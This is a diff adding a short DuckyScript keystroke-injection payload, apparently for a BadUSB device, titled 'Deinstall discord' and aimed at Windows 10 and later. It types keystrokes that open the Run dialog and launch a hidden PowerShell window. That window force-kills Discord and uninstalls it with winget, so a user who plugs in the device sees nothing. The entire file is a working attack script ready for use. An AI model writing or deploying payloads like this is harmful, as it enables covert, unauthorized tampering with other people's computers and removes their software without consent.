@@ -1,0 +1,10 @@
+REM Title: Deinstall discord 
+REM Target: Windows 10+
+REM Author: SuperJakov
+REM Execution time: 0.8s
+
+DELAY 500
+GUI r 
+DELAY 500
+STRING powershell -w h taskkill /f /im discord.exe;winget uninstall Discord.Discord
+ENTER
